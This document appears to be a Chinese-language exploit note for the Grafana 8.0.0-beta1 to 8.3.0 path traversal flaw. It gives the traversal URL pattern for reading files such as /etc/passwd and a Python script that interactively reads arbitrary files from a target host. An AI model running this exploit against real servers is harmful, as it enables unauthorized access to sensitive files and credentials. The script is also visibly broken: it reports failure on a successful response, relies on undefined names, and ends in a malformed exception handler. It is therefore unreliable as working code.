验证漏洞存在方法
    - 访问目标Grafana实例的`/public/plugins/<plugin_id>/../../../../../../../../../../../../..`路径，尝试读取`/etc/passwd`等敏感文件
    - 如果返回文件内容而不是"Plugin file not found"错误，则说明存在漏洞

漏洞利用方法
    - Grafana版本8.0.0-beta1到8.3.0存在目录遍历漏洞，攻击者可以通过构造特殊的URL路径访问服务器上的任意文件
    - 漏洞路径格式：`<grafana_host_url>/public/plugins/<plugin_id>/../../../../../../../../../../../../..<file_path>`
    - 其中`<plugin_id>`可以是任意已安装插件的ID，如"alertlist"、"annolist"等

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:

                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:

    main()
